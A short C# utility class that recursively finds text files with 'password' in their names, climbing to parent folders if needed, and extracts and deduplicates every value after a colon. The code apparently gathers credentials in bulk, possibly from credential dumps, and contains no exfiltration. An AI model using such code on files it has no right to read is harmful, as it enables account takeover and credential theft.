using System.Text.RegularExpressions;

public class Utils
{
    public static bool TryCreateDirectory(string path)
    {
        try
        {
            Directory.CreateDirectory(path);
            return true;
        }
        catch (IOException)
        {
            return false;
        }
    }

    public static List<string>? GetLines(string path)
    {
        var PasswordsData = File.ReadAllText(path);
        var PasswordsLines = new List<string>();
        var Regex = new Regex("(: )(.*)");
        var Matches = Regex.Matches(PasswordsData);
        if (Matches.Count < 1) return null;

        foreach (Match Match in Matches)
        {
            if (Match is not null) PasswordsLines.Add(Match.Groups[2].Value.Trim());
        }

        return PasswordsLines.ToHashSet().ToList();
    }

    public static List<string>? FindPasswords(string root_path, string? path = null)
    {
        List<string> Passwords = new();

        if (path == root_path) return null;
        path ??= root_path;

        var Files = Directory.GetFiles(path, "*.txt", SearchOption.AllDirectories)
            .Where(el => el.Contains("assword"))
            .ToList();
        if (Files.Count < 1) return FindPasswords(root_path, Path.GetDirectoryName(path));

        foreach (var File in Files)
        {
            var Lines = GetLines(File);
            if (Lines is null) continue;

            Lines.ForEach(el => Passwords.Add(el));
        }

        return Passwords;
    }
}
